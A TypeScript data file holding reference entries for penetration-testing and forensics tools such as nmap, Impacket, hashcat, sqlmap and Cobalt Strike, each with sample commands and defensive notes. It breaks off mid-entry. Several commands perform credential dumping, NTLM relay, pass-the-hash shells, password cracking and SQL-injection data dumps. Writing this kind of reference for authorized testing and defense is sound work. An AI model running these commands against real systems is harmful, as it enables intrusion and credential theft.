import type { ToolEnrichment } from "./types";

/** Hand-written reference content: 12 popular tools, 5 archives, Metasploit, ~40 common Kali packages. */
export const RICH_CONTENT: Record<string, ToolEnrichment> = {
  nmap: {
    overview: [
      "Nmap (Network Mapper) sends crafted packets to targets and interprets responses to map hosts, open ports, service versions, and—when permitted—operating system fingerprints. It supports dozens of scan techniques from bare ICMP echo discovery through full TCP connect and half-open SYN scans.",
      "The Nmap Scripting Engine (NSE) extends probes with Lua scripts organized by category: auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. Scripts run in parallel with port scanning and can chain findings (e.g., smb-vuln-* after smb-os-discovery).",
      "Output formats include normal (-oN), XML (-oX for import into Nessus/Greenbone), grepable (-oG), and the structured -oA bundle. Timing templates (-T0 through -T4, plus -T5 paranoid/aggressive) control parallelism and delay; -T3 is the default balance for lab networks.",
      "Common OPSEC failures: running -A (OS + version + script + traceroute) against production without scope, leaving connection logs on stateful firewalls from full connect scans (-sT), and running intrusive NSE scripts (category intrusive/vuln) without understanding side effects like account lockout or service crashes.",
    ],
    useCases: [
      "Host discovery on a /24 before deeper assessment (-sn, -PE, -PS443)",
      "Port enumeration with service/version fingerprinting (-sS -sV -p-)",
      "Script-driven vuln checks against known CVEs (–script vuln, smb-vuln-ms17-010)",
      "UDP service mapping for DNS, SNMP, TFTP (-sU --top-ports 100)",
      "Baseline asset inventory and change detection via scheduled -oX diffs",
    ],
    commands: [
      {
        label: "SYN scan + version + default scripts",
        code: "nmap -sS -sV -sC -p- -T4 --open -oA scan_target target.example.com",
      },
      {
        label: "Fast top ports, no ping",
        code: "nmap -Pn -sS --top-ports 1000 -oG - target.example.com",
      },
      {
        label: "Targeted NSE vuln category",
        code: "nmap -sV --script 'vuln and safe' -p 445,3389 10.0.0.0/24",
      },
      {
        label: "UDP discovery",
        code: "nmap -sU -sV --top-ports 20 -T4 target.example.com",
      },
    ],
    features: [
      "Scan types: -sS SYN, -sT connect, -sU UDP, -sA ACK (firewall mapping), -sN/-sF/-sX null/fin/Xmas",
      "OS detection (-O) uses TCP/IP stack quirks; requires at least one open and one closed port",
      "NSE: 600+ scripts; --script-help, --script-args, script dependencies via requires/dependencies fields",
      "Zenmap GUI, ndiff for XML diffing, nping for raw packet generation",
    ],
    defense: [
      "SYN scans appear as half-open connections; log RST responses and rate-limit per source",
      "Version detection sends probe payloads; IDS signatures often trigger on Nmap probe patterns",
      "Restrict ICMP and unsolicited SYN to edge; segment internal scanning visibility",
      "Honeypot/open-port noise can poison OS fingerprint confidence scores",
    ],
    related: ["masscan", "wireshark", "nikto", "nuclei"],
  },

  "burp-suite": {
    overview: [
      "Burp Suite sits between browser and application as an intercepting HTTP/S proxy. Every request and response passes through Burp's pipeline where you can modify, replay, fuzz, or automate analysis before forwarding to the destination.",
      "The core workflow: configure browser proxy → intercept on → browse target → send interesting requests to Repeater for manual tampering → scale with Intruder (position markers + payload sets) → Scanner (Pro) for active vuln checks. Extensions via the Extender API add custom checks in Java or Python (Jython).",
      "Burp holds session state through cookies, CSRF tokens, and macro sequences. Sequences and session handling rules re-apply login flows before Intruder or Scanner runs so authenticated endpoints stay in scope.",
      "Collaborator (Pro) provides out-of-band interaction detection for blind SSRF, XXE, and deserialization bugs via DNS/HTTP callbacks to burpcollaborator.net or a private collaborator server.",
    ],
    useCases: [
      "Manual testing of auth, access control, and business logic flaws",
      "Parameter fuzzing for SQLi, XSS, and IDOR via Intruder sniper/battering ram modes",
      "Mapping attack surface with Site map and content discovery",
      "Active scanning (Pro) for reflected/stored XSS, SSRF, and injection classes",
      "Extension development for bespoke API formats (gRPC, GraphQL, custom JSON)",
    ],
    commands: [
      {
        label: "Launch Burp (Kali)",
        code: "burpsuite &",
      },
      {
        label: "Headless project load (Pro automation)",
        code: "java -jar burpsuite_pro.jar --project-file=project.burp --unpause-spider-and-scanner",
      },
    ],
    features: [
      "Proxy: intercept, match/replace rules, HTTP history, WebSockets",
      "Repeater: single-request editor with render/raw/hex views",
      "Intruder: sniper, battering ram, pitchfork, cluster bomb attack types",
      "Decoder, Comparer, Sequencer (token entropy), Logger++, DOM Invader",
      "BApp Store extensions: Autorize, Turbo Intruder, JWT Editor, Logger+",
    ],
    defense: [
      "WAF/IPS may fingerprint Burp default User-Agent and TLS JA3; rotate profiles",
      "Rate-based blocking on Intruder; monitor 429/503 spikes from single client IP",
      "Log X-Forwarded-For at app layer when proxy chains obscure origin",
    ],
    related: ["sqlmap", "nikto", "nuclei", "shannon"],
  },

  wireshark: {
    overview: [
      "Wireshark captures live traffic from interfaces or reads PCAP/PCAPNG files offline. Dissectors decode layers (Ethernet → IP → TCP → TLS → HTTP) and expose field filters for precise display filtering.",
      "Display filters (e.g., `http.request.method == \"POST\" && ip.addr == 10.0.0.5`) differ from capture filters (BPF syntax on tcpdump: `host 10.0.0.5 and port 443`). Capture filters reduce volume at collection time; display filters slice already-captured data.",
      "Follow TCP/UDP streams reconstructs application conversations. Export objects pulls files from HTTP, SMB, and other protocols. Expert info flags retransmissions, checksum errors, and malformed packets.",
      "For TLS, Wireshark decrypts if you supply a key log file (SSLKEYLOGFILE env var in browser) or RSA key (legacy). Without keys, you see ClientHello/SNI and metadata only.",
    ],
    useCases: [
      "Incident response triage on PCAPs from compromised hosts",
      "Debugging application protocol behavior and malformed packets",
      "Extracting credentials from cleartext protocols (HTTP Basic, FTP, Telnet, LDAP simple bind)",
      "VoIP/RTP stream playback and SIP ladder diagrams",
      "Validating firewall rules and identifying unexpected egress",
    ],
    commands: [
      {
        label: "Capture to file (CLI tshark)",
        code: "tshark -i eth0 -f 'tcp port 443' -w capture.pcapng",
      },
      {
        label: "Read PCAP with display filter",
        code: "tshark -r capture.pcapng -Y 'dns.flags.response == 0' -T fields -e dns.qry.name",
      },
      {
        label: "Decrypt TLS with key log",
        code: "tshark -r capture.pcapng -o tls.keylog_file:sslkeys.log -Y http",
      },
    ],
    features: [
      "2000+ protocol dissectors; custom dissectors via Lua",
      "IO graphs, flow graphs, TCP stream graphs for throughput analysis",
      "Statistics: protocol hierarchy, conversations, endpoints, HTTP request sequences",
      "Mergecap, editcap, capinfos CLI utilities in the Wireshark suite",
    ],
    defense: [
      "Encrypt sensitive protocols; assume cleartext on LAN is observable",
      "Monitor for promiscuous-mode NICs and SPAN port access",
      "DNS query logging complements PCAP for exfil detection without full capture",
    ],
    related: ["tcpdump", "ettercap", "snort", "nmap"],
  },

  bloodhound: {
    overview: [
      "BloodHound models Active Directory as a graph: users, groups, computers, GPOs, OUs, and the edges that grant control (GenericAll, WriteDACL, MemberOf, AdminTo, HasSession, etc.). Attackers query paths from owned principals to high-value targets like Domain Admins or Enterprise Admins.",
      "Data collection uses SharpHound (Windows/.NET) or bloodhound.py (Linux/Python) ingestors. Collectors pull LDAP, SMB session data, local group membership, ACLs, and CA enrollment templates. Output JSON zip bundles import into the BloodHound UI (legacy) or BloodHound CE with Neo4j backend.",
      "Pre-built Cypher queries surface kerja misconfigs: Kerberoastable users, AS-REP roastable accounts, unconstrained delegation, DCSync rights (GetChanges/GetChangesAll on domain NC), and paths to Tier-0 assets.",
      "BloodHound does not exploit anything—it prioritizes attack paths. Blue teams use the same graph to identify and break dangerous edges before attackers traverse them.",
    ],
    useCases: [
      "Post-compromise AD mapping after initial foothold on a workstation",
      "Identifying ACL abuse paths (GenericWrite → UserForceChangePassword → DCSync chain)",
      "Finding session hops via HasSession edges to Tier-0 systems",
      "Audit of tiering violations and excessive group nesting",
      "Tracking remediation by re-ingesting after ACL hardening",
    ],
    commands: [
      {
        label: "SharpHound all collection (Windows)",
        code: "SharpHound.exe -c All --zipfilename loot.zip",
      },
      {
        label: "bloodhound.py LDAP-only (stealthier)",
        code: "bloodhound-python -u user -p 'pass' -d corp.local -ns 10.0.0.1 -c DCOnly",
      },
      {
        label: "BloodHound CE ingest",
        code: "Upload ZIP via UI → Explore → Pre-built queries → Find all Domain Admins",
      },
    ],
    features: [
      "Nodes: User, Group, Computer, GPO, OU, Domain, Container, CertTemplate",
      "Edges encode AD rights and session relationships with abuse semantics",
      "Custom Cypher queries in Neo4j for bespoke path analysis",
      "AzureHound extends graph model to Entra ID / Azure RBAC (separate collector)",
    ],
    defense: [
      "Remove unnecessary ACL grants; audit GenericAll/WriteDACL on domain root",
      "Tier admin accounts; deny interactive logon to lower tiers",
      "Monitor LDAP enumeration volume from non-admin workstations",
      "Protect BloodHound ingest credentials—collectors need broad read access",
    ],
    related: ["impacket", "crackmapexec", "responder", "bloodhound.py"],
  },

  "cobalt-strike": {
    overview: [
      "Cobalt Strike is a commercial adversary simulation and red team C2 platform. A team server coordinates Beacon implants deployed on compromised hosts. Operators interact through the Aggressor scriptable client (Java) or headless automation.",
      "Beacon is a staged/post-exploitation agent supporting sleep/jitter, SMB/TCP/HTTP/HTTPS/DNS egress, pivoting, credential harvesting, and post-ex modules. Malleable C2 profiles customize HTTP indicators, transaction transforms, and server headers to blend with expected traffic.",
      "The kill chain in CS terms: initial access (external) → Beacon staging → enumeration → lateral movement (psexec, WMI, SMB) → privilege escalation → objective. Built-in workflows mirror APT tradecraft for purple-team exercises.",
      "Licensing is per-operator; unauthorized use violates terms and often law. Defenders study CS indicators (default certificates, profile artifacts, named pipes) because crimeware and APT groups have leaked or replicated CS tooling.",
    ],
    useCases: [
      "Full-scope red team engagements with structured reporting",
      "Purple-team detection validation against realistic C2 traffic",
      "Training blue teams on Beacon lifecycle and lateral movement TTPs",
      "Long-haul persistence and egress testing through restrictive proxies",
    ],
    commands: [
      {
        label: "Start team server (operator host)",
        code: "./teamserver 203.0.113.10 'SharedPassword' profile.ja",
      },
      {
        label: "Generate HTTP Beacon (Aggressor)",
        code: "Attacks → Packages → Windows Executable (S) → listener: https-beacon",
      },
      {
        label: "Pivot via SOCKS (Beacon console)",
        code: "beacon> socks 1080",
      },
    ],
    features: [
      "Malleable C2 profiles: http-get, http-post, dns-beacon stanzas",
      "Aggressor Script: automate sleep, spawn, lateral movement",
      "Beacon Object Files (BOF): in-process post-ex without fork/spawn",
      "External C2, pivoting, keystroke logging, screenshot, hashdump",
      "Integration with Metasploit and third-party implants via bridges",
    ],
    defense: [
      "JA3/JA3S and HTTP header anomalies vs baseline corporate traffic",
      "Named pipe patterns (e.g., MSSE-*), default CS certificate hashes",
      "ETW/Sysmon: suspicious process ancestry from rundll32, regsvr32",
      "Network: long-lived HTTPS to rare domains, DNS beaconing regularity",
    ],
    related: ["metasploit", "impacket", "bloodhound", "armitage"],
  },

  hashcat: {
    overview: [
      "Hashcat performs offline password recovery using CPU, GPU (OpenCL/CUDA), or both. It supports 300+ hash modes (-m): NTLM, bcrypt, WPA-PBKDF2, Kerberos TGS-REP, Office, PDF, blockchain wallets, and raw ciphers via specific mode numbers.",
      "Attack modes: straight (-a 0 wordlist), combination (-a 1), brute-force/mask (-a 3), hybrid wordlist+mask (-a 6/7), and association (-a 9). Rules (-r best64.rule) mutate wordlist entries; masks like ?u?l?l?l?d?d?d?d define charset positions.",
      "Performance depends on hash type: NTLM is fast on GPU (billions/sec); bcrypt/scrypt are intentionally slow. Use --benchmark and --machine-readable for capacity planning. potfile (hashcat.pot) caches cracked hashes.",
      "Input formats vary by mode: use --example-hashes to see expected hash line format. HCCAPX for WPA; keepass hash modes for KeePass databases; kerberos 13100 for TGS-REP etype 23.",
    ],
    useCases: [
      "Cracking NTLM dumps from LSASS/secretsdump for lateral movement",
      "WPA2 handshake recovery after capture with aircrack-ng/hcxdumptool",
      "Rules-based attacks against enterprise password patterns",
      "Mask attacks when policy enforces length/complexity (e.g., Summer2024!)",
      "Benchmarking GPU rig before engagement",
    ],
    commands: [
      {
        label: "NTLM wordlist attack",
        code: "hashcat -m 1000 -a 0 ntlm_hashes.txt wordlist.txt -r rules/best64.rule",
      },
      {
        label: "Mask brute-force (8 char, upper+lower+digit)",
        code: "hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?d?d",
      },
      {
        label: "WPA-PBKDF2 (mode 22000)",
        code: "hashcat -m 22000 -a 0 capture.hc22000 wordlist.txt",
      },
      {
        label: "Show cracked",
        code: "hashcat -m 1000 hashes.txt --show",
      },
    ],
    features: [
      "Brain server for distributed cracking across nodes",
      "Princeprocessor integration for advanced word generation",
      "Restore/checkpoint (-restore) for long mask runs",
      "Hashcat-utils: cap2hccapx, maskprocessor, statsprocessor",
    ],
    defense: [
      "Use slow KDFs (bcrypt, Argon2) for application passwords",
      "Long passphrases defeat mask attacks more than complexity rules",
      "Monitor for bulk auth failures; NTLM relay differs from offline crack but often paired",
      "WPA3-SAE reduces offline handshake attack surface vs WPA2",
    ],
    related: ["john", "hydra", "impacket", "aircrack-ng"],
  },

  impacket: {
    overview: [
      "Impacket is a Python collection implementing network protocols (SMB, MSRPC, Kerberos, LDAP, etc.) with both library APIs and example scripts used heavily in Windows/AD pentesting. Scripts live under examples/ and install as CLI tools on Kali.",
      "secretsdump.py remotely extracts SAM, LSA secrets, and NTDS.dit via DRSUAPI or VSS shadow copy—core technique for DCSync-style credential harvesting when admin rights exist. psexec.py and wmiexec.py provide semi-interactive shells over SMB/WinRM.",
      "Kerberos tooling: getTGT.py, getST.py (S4U2self/S4U2proxy), ticketer.py for golden/silver tickets. ntlmrelayx.py relays captured NTLM auth to targets lacking SMB signing.",
      "Most scripts accept -hashes for pass-the-hash, -k for Kerberos tickets, and -no-pass for implicit auth on Windows when run from domain context.",
    ],
    useCases: [
      "Domain credential extraction after obtaining DA or DCSync rights",
      "Lateral movement via WMI, SMB, or WinRM with stolen hashes",
      "Kerberoasting (GetUserSPNs.py) and AS-REP roasting (GetNPUsers.py)",
      "NTLM relay attacks combined with Responder poisoning",
      "PetitPotam/PrinterBug coercion to force auth to relay target",
    ],
    commands: [
      {
        label: "Remote secrets dump",
        code: "secretsdump.py CORP/administrator@dc01.corp.local -hashes :ntlmhash",
      },
      {
        label: "Kerberoastable SPNs",
        code: "GetUserSPNs.py corp.local/user:password -request -outputfile tickets.txt",
      },
      {
        label: "NTLM relay (multi-target)",
        code: "ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'",
      },
      {
        label: "WMI semi-interactive shell",
        code: "wmiexec.py -hashes :HASH corp.local/admin@10.0.0.50",
      },
    ],
    features: [
      "Library modules: smb, smb3, ldap, kerberos, ntlm, dcerpc",
      "Golden ticket: ticketer.py with krbtgt hash",
      "smbclient.py, lookupsid.py, rpcdump.py for enumeration",
      "atexec.py, dcomexec.py alternative execution vectors",
    ],
    defense: [
      "Enable SMB signing on all hosts; EPA on LDAP/AD CS",
      "Tier-0 credential hygiene; monitor DCSync replication events (4662)",
      "Detect unusual Kerberos TGS-REQ volume (Kerberoasting)",
      "Disable NTLM where possible; enforce LDAP signing/channel binding",
    ],
    related: ["bloodhound", "responder", "crackmapexec", "evil-winrm"],
  },

  ghidra: {
    overview: [
      "Ghidra is NSA's open-source software reverse engineering suite. It loads binaries (PE, ELF, Mach-O, raw), disassembles, decompiles to C-like pseudocode, and supports collaborative analysis via shared project repositories.",
      "The CodeBrowser is the main workspace: Listing (disassembly), Decompiler, Defined Strings, Symbol Tree, and Function Graph. Analysis runs auto-identify functions, strings, and imports on import; additional analyzers refine stack frames and calling conventions.",
      "Scripting in Java or Python (Jython) automates labeling, struct recovery, and batch processing. Ghidra 11+ adds native Python via GhidraBridge. Version tracking diffing compares firmware builds for patch analysis.",
      "Headless analyzer (analyzeHeadless) runs imports, analysis, and script export in CI or bulk malware triage pipelines.",
    ],
    useCases: [
      "Malware unpacking and C2 protocol recovery",
      "Vulnerability research on closed-source binaries",
      "Firmware analysis for embedded device assessments",
      "Patch diffing between vendor updates",
      "CTF crackmes and algorithm recovery",
    ],
    commands: [
      {
        label: "Headless import and analyze",
        code: "analyzeHeadless /projects proj -import malware.exe -postScript ExportFunctions.py",
      },
      {
        label: "Launch GUI (Kali)",
        code: "ghidra &",
      },
    ],
    features: [
      "Decompiler with variable recovery and type propagation",
      "P-Code intermediate representation for cross-arch analysis",
      "Debugger integration (GDB, WinDbg via connectors)",
      "Function ID, data type archives, FLIRT-style signature matching",
      "BSim: binary similarity search across corpora",
    ],
    defense: [
      "Obfuscation, packers, and anti-debug increase analyst time—not prevention",
      "Symbol stripping and control-flow flattening degrade decompiler output",
      "Threat intel shares Ghidra projects/labels for known malware families",
    ],
    related: ["binwalk", "yara", "jadx", "radare2"],
  },

  yara: {
    overview: [
      "YARA describes patterns to classify and identify malware samples. Rules combine string literals, hex jumps/wildcards, and boolean conditions over file size, entry point, and matched offsets.",
      "Conditions can reference other rules, use modules (pe, elf, dotnet, hash, math, time), and count matches (`#s1 > 3 and uint16(0) == 0x5A4D`). Rules compile to bytecode scanned by libyara across files, processes, and memory.",
      "yarac compiles rules to binary form; yara scans targets. Integration points: ClamAV, VirusTotal Livehunt, osquery, Velociraptor, and custom IR pipelines.",
      "Rule quality matters: overly broad strings cause false positives; anchor on PE sections, export names, or encoded config blobs unique to a family.",
    ],
    useCases: [
      "Hunting malware families across endpoint/file shares",
      "Email gateway attachment screening with custom rules",
      "Memory scanning for injected shellcode or reflective DLLs",
      "Validating unpacker output against known packer signatures",
      "Threat intel sharing via rule repositories (Yara-Rules, Neo23x0)",
    ],
    commands: [
      {
        label: "Scan directory recursively",
        code: "yara -r family_rule.yar /path/to/samples/",
      },
      {
        label: "Compile rules",
        code: "yarac rules/*.yar compiled.yarc",
      },
      {
        label: "Example rule (PE overlay)",
        code: "rule example {\n  strings:\n    $a = \"malicious_config\" ascii wide\n  condition:\n    pe.is_pe and $a\n}",
      },
    ],
    features: [
      "Modules: pe, elf, dotnet, hash, math, time, cuckoo, virustotal",
      "External variables (-d) for contextual scanning",
      "Fast multi-pattern Aho-Corasick search engine",
      "Yara-X (Rust rewrite) for performance-critical deployments",
    ],
    defense: [
      "Attackers mutate strings and encrypt configs to evade static rules",
      "Combine YARA with behavioral detection and network IOCs",
      "Test rules against clean corpora before production deployment",
    ],
    related: ["volatility", "ghidra", "binwalk", "volatility3"],
  },

  volatility: {
    overview: [
      "Volatility 3 analyzes raw memory dumps (VM snapshots, crash dumps, hibernation files) to extract forensic artifacts without a live OS. Plugins address processes, network connections, registry hives, kernel modules, and malware injection.",
      "Architecture: layered stack (automagic layer detection) → symbol tables (JSON ISF) → plugin framework. Each plugin returns structured output (TreeGrid) rather than the monolithic profile system of Vol2.",
      "Common workflow: identify OS layer (`windows.info`, `linux.info`) → list processes (`windows.pslist`, `windows.pstree`) → dump suspicious processes (`windows.memmap` + `windows.dumpfiles`) → scan for injection (`windows.malfind`) → extract credentials (`windows.hashdump`, `windows.lsadump`).",
      "Symbols must match kernel build; without ISF, some plugins fail or return incomplete data. Community ISF builds exist for common Windows 10/11 builds.",
    ],
    useCases: [
      "IR triage: processes, cmdlines, DLLs loaded at incident time",
      "Detecting process hollowing and unlinked EPROCESS entries",
      "Recovering network connections and cached browser artifacts from RAM",
      "Rootkit detection via SSDT hooks and orphaned threads",
      "Comparing pslist vs psscan for hidden process detection",
    ],
    commands: [
      {
        label: "Image info and layer detection",
        code: "vol -f memory.dmp windows.info",
      },
      {
        label: "Process tree",
        code: "vol -f memory.dmp windows.pstree",
      },
      {
        label: "Malware injection scan",
        code: "vol -f memory.dmp windows.malfind",
      },
      {
        label: "Registry print key",
        code: "vol -f memory.dmp windows.registry.printkey --key 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
      },
    ],
    features: [
      "Cross-platform: Windows, Linux, macOS plugins",
      "yarascan for in-memory YARA matching",
      "Custom plugins via Python API",
      "volshell interactive memory exploration",
    ],
    defense: [
      "Memory capture triggers EDR telemetry; some malware clears artifacts on dump",
      "Live kernel patching can hide from pslist; cross-check psscan and callbacks",
      "Encrypt sensitive data in memory where possible; minimize credential lifetime",
    ],
    related: ["yara", "volatility3", "autopsy", "wireshark"],
  },

  volatility3: {
    overview: [
      "Volatility 3 is the current major branch of the Volatility memory forensics framework. Same plugin/layer model as documented for Volatility; Kali ships volatility3 as the primary `vol` command.",
      "Prefer `volatility3` documentation and symbol tables for new engagements. Legacy Volatility 2 profiles are not compatible—use the v3 ISF symbol format.",
    ],
    useCases: [
      "Same as Volatility: process analysis, injection detection, credential recovery",
      "Automated IR pipelines with JSON renderer (`-r json`)",
    ],
    commands: [
      {
        label: "List plugins",
        code: "vol -h | grep windows",
      },
      {
        label: "JSON output for automation",
        code: "vol -f memory.dmp -r json windows.pslist.PsList > pslist.json",
      },
    ],
    related: ["volatility", "yara", "autopsy"],
  },

  nuclei: {
    overview: [
      "Nuclei is a template-based scanner from ProjectDiscovery. YAML templates define HTTP/DNS/TCP/network requests, matchers (status, regex, DSL), and extractors. Thousands of community templates cover CVEs, misconfigs, and technology fingerprinting.",
      "Execution is fast and parallel (`-c` concurrency, `-rate-limit`). Templates tag by severity, author, and protocol. Workflows chain templates (e.g., detect tech → run targeted CVE checks).",
      "Integrates with httpx, subfinder, naabu in PD recon pipelines—or use SIF as a single-binary alternative with nuclei compiled in. Custom templates suit internal apps with proprietary endpoints.",
      "False positives happen when matchers are too loose; tune with `-tags`, `-severity`, and `-exclude-templates`. `-interactsh-url` enables OOB detection like Burp Collaborator.",
    ],
    useCases: [
      "Mass external attack surface scanning after subdomain enum",
      "CI/CD DAST gates with critical/high severity only",
      "CVE regression checks after patch Tuesday",
      "Detecting exposed admin panels, .git, backup files",
      "Technology && config checks (S3 open buckets, default creds)",
    ],
    commands: [
      {
        label: "Scan targets from file, critical/high only",
        code: "nuclei -l urls.txt -severity critical,high -o findings.txt",
      },
      {
        label: "Specific tags",
        code: "nuclei -u https://target.example.com -tags cve,wordpress",
      },
      {
        label: "Custom template",
        code: "nuclei -u https://target.example.com -t ./custom/check-exposed-env.yaml",
      },
    ],
    features: [
      "Protocols: HTTP, DNS, TCP, SSL, WHOIS, code, headless browser",
      "DSL for complex matchers and dynamic payloads",
      "Reporting: JSON, SARIF, Markdown",
      "Nuclei Templates GitHub repo with versioned CVE checks",
    ],
    defense: [
      "High-volume scanning is noisy in WAF/CDN logs; rate-limit and scope",
      "Patch and reduce exposed services; templates lag zero-days",
      "Honeypot endpoints can trigger false positive cascades",
    ],
    related: ["nikto", "nmap", "ffuf", "burp-suite", "sif"],
  },

  sif: {
    overview: [
      "SIF (github.com/vmfunc/sif) is a Go recon and exploitation scanner that runs the full external assessment chain from a single static binary. Subdomain enumeration, connect-based port scanning, web crawling, nuclei template execution, framework/CVE detection, JavaScript secret extraction, CORS/XSS/redirect probes, cloud misconfiguration checks, and subdomain takeover detection are all flag-selectable modules—not separate processes wired together.",
      "Nuclei and Colly are linked as libraries, not invoked via exec.Command, so there is no runtime dependency on external nuclei or crawler binaries. One build ships everything. Port scanning uses connect() rather than raw SYN; rustscan and nmap remain faster for raw port sweeps, but HTTP-heavy modules benefit from a shared connection-pooled client.",
      "Every scanner shares one HTTP client and a work-stealing worker pool. Global `-proxy`, `-H`/`--header`, `-cookie`, and `-rate-limit` apply across the entire run. Connections are reused across modules—a single-host run reuses one connection for roughly fifty requests instead of opening fifty separate TCP sessions. Slow targets do not block the rest of the queue.",
      "SIF reads targets from `-u`, `-f`, or stdin (scheme-less hosts default to https). Under `-silent`, banner and log output go to stderr while findings print one normalized line per hit to stdout, so it drops into Unix pipelines: `subfinder -d example.com | sif -silent -crawl -js -nuclei | notify`. `-diff` snapshots findings per target and reports only deltas on re-scan; `-sarif` and `-markdown` export for CI; `-notify` posts to Slack, Discord, Telegram, or generic webhooks using notify-compatible config.",
    ],
    useCases: [
      "Single-command external recon after scope approval (dnslist + ports + headers + framework + nuclei)",
      "Pipeline glue: feed subfinder/amass hostnames on stdin for probe/crawl/js/nuclei passes",
      "Continuous monitoring with `-diff` to surface new or removed findings between scheduled runs",
      "CI/CD security gates with `-sarif` output for GitHub code scanning ingestion",
      "Broad web vuln sweeps: CORS, open redirect, reflected XSS, JWT weakness, OpenAPI exposure",
      "Passive subdomain/URL discovery (`-passive`) when zero direct traffic to the target is required",
    ],
    commands: [
      {
        label: "Broad recon sweep",
        code: "sif -u https://example.com -dnslist -ports -crawl -js -framework -nuclei",
      },
      {
        label: "Directory fuzzing with auto-calibration",
        code: "sif -u https://example.com -dirlist medium -ac -mc 200,301,302",
      },
      {
        label: "Web vuln probes + report export",
        code: "sif -u https://example.com -cors -redirect -xss -sarif out.sarif -md out.md",
      },
      {
        label: "Pipeline from subdomain enum",
        code: "subfinder -d example.com | sif -silent -probe -crawl -js -nuclei",
      },
      {
        label: "Diff monitoring (second run shows delta only)",
        code: "sif -u https://example.com -sh -cors -diff",
      },
      {
        label: "Proxy, auth header, and rate cap applied globally",
        code: 'sif -u https://example.com -headers -proxy socks5://127.0.0.1:1080 -H "Authorization: Bearer tok" -rate-limit 20',
      },
      {
        label: "Run custom YAML modules by tag",
        code: "sif -u https://example.com -mt owasp-top10",
      },
    ],
    features: [
      "25+ built-in scan flags: dirlist, dnslist, ports, nuclei, crawl, js, framework, cms, git, cors, xss, redirect, sql, lfi, jwt, openapi, favicon, c3, st, passive, probe, and more",
      "YAML module system (`-m`, `-mt`, `-am`); user modules in ~/.config/sif/modules/ with nuclei-like HTTP matchers",
      "Shodan (`-shodan`, SHODAN_API_KEY) and SecurityTrails (`-securitytrails`, SECURITYTRAILS_API_KEY) target expansion",
      "Dirlist filters: `-mc`/`-fc` status codes, `-fs` body size, `-fw` word count, `-fr` regex, `-w` custom wordlist, `-e` extensions",
      "Package managers: Homebrew tap, AUR, nixpkgs, Debian/Ubuntu apt (Cloudsmith), release binaries; BSD-3-Clause",
      "Subcommands: `sif version`, `sif patchnote` (release notes on first run; disable with SIF_NO_PATCHNOTES=1)",
    ],
    defense: [
      "High request volume from combined modules triggers WAF/CDN rate limits and SOC alerts—scope and throttle `-rate-limit`",
      "Connect port scans are logged as full TCP connections; SYN scans from dedicated tools may be stealthier",
      "Nuclei template false positives still apply; tune severity and custom modules for production targets",
      "Webhook notify configs and API keys in env vars should not land in shell history or CI logs",
    ],
    related: ["nuclei", "subfinder", "nmap", "ffuf", "nikto", "sqlmap"],
  },

  sqlmap: {
    overview: [
      "sqlmap automates detection and exploitation of SQL injection. It supports boolean, error, union, stacked, and time-based blind techniques across MySQL, PostgreSQL, Oracle, MSSQL, SQLite, and others.",
      "Detection pipeline: parameter fuzzing → DBMS fingerprint → enumeration (databases, tables, columns) → data dump → file read/write → OS shell via UDF/xp_cmdshell when privileges allow.",
      "Tamper scripts mutate payloads to evade WAFs (space2comment, between, randomcase). `--level` and `--risk` control test depth and dangerous payloads. Session pickle files resume long runs.",
      "Always obtain authorization; `--os-shell` and `--file-write` are destructive. Use `--batch` for non-interactive CI with predefined answers.",
    ],
    useCases: [
      "Confirming and exploiting SQLi found during manual web testing",
      "Dumping credential tables for password analysis",
      "Reading config files via LOAD_FILE or stacked queries",
      "Second-order injection testing with `-p` and `--second-url`",
      "WAF bypass tuning with tamper script chains",
    ],
    commands: [
      {
        label: "Basic GET parameter test",
        code: "sqlmap -u 'https://target/item?id=1' --batch --dbs",
      },
      {
        label: "POST request from Burp save file",
        code: "sqlmap -r request.txt -p username --level 3 --risk 2",
      },
      {
        label: "Dump specific table",
        code: "sqlmap -u 'https://target/item?id=1' -D appdb -T users --dump",
      },
      {
        label: "Tamper for WAF evasion",
        code: "sqlmap -u 'https://target/item?id=1' --tamper=space2comment,between --random-agent",
      },
    ],
    features: [
      "Direct connection (-d) for DB creds without HTTP",
      "SQL shell, OS shell, Metasploit integration (--os-pwn)",
      "Automatic Tor/proxy rotation (--tor)",
      "Enumeration: users, passwords, roles, UDF injection",
    ],
    defense: [
      "Parameterized queries / ORM; never concatenate user input",
      "Least-privilege DB accounts; disable xp_cmdshell and file privileges",
      "WAF + query allowlists; log SQL errors server-side only",
      "Detect sqlmap User-Agent and timing-based scan patterns",
    ],
    related: ["burp-suite", "nikto", "nuclei"],
  },

  // ─── Archives / links ───────────────────────────────────────────────

  "church-of-malware": {
    overview: [
      "Church of Malware (churchofmalware.org) is a curated malware reference library styled as archival scripture. It indexes samples, family lineage, and researcher writeups in a browsable corpus rather than a raw drop zone.",
      "The site organizes materialized into books/chapters metaphor—scripture sections map to families, variants, and historical notes. Useful when tracing evolution between strains or finding primary-source descriptions when VT hashes are dead.",
      "Researchers use it for contextual background before deep RE: behavior summaries, naming conventions, and cross-links to related families. Not a substitute for dynamic analysis or sandbox reports.",
      "Content is researcher-oriented; verify hashes independently before execution in any lab. Licensing and download terms vary by entry.",
    ],
    useCases: [
      "Historical malware family research and lineage tracing",
      "Finding writeups when public sandboxes lack narrative context",
      "Teaching malware taxonomy with indexed references",
      "Cross-referencing family names across intel sources",
    ],
    defense: [
      "Treat all linked samples as malicious; isolate lab execution",
      "Block outbound C2 if analyzing live configs from archived samples",
    ],
    related: ["vx-underground", "yara", "ghidra"],
  },

  "vx-underground": {
    overview: [
      "VX Underground (vx-underground.org) is one of the largest public malware archives and threat research repositories. It hosts samples, papers, ebooks, training material, and community collections spanning decades of malware history.",
      "Collections include APT reports, ransomware builds, proof-of-concept exploit code, and educational texts (e.g., classic virus writing manuals for historical study). The site survived multiple takedown attempts and mirrors; check current domain status.",
      "Researchers use vx-underground for offline sample retrieval, comparing hash variants, and accessing papers not on arXiv or publisher sites. Telegram/Discord communities often announce new uploads.",
      "Operational security: downloading known malware triggers AV/EDR. Use isolated VMs, hash verify, and legal compliance with local computer misuse laws.",
    ],
    useCases: [
      "Retrieving samples referenced in threat intel reports",
      "Malware research coursework and historical analysis",
      "Locating leaked builder source for signature development",
      "Archive backup when private shares disappear",
    ],
    defense: [
      "Network egress filtering from analysis VLANs",
      "YARA sweep after any extract from archive downloads",
    ],
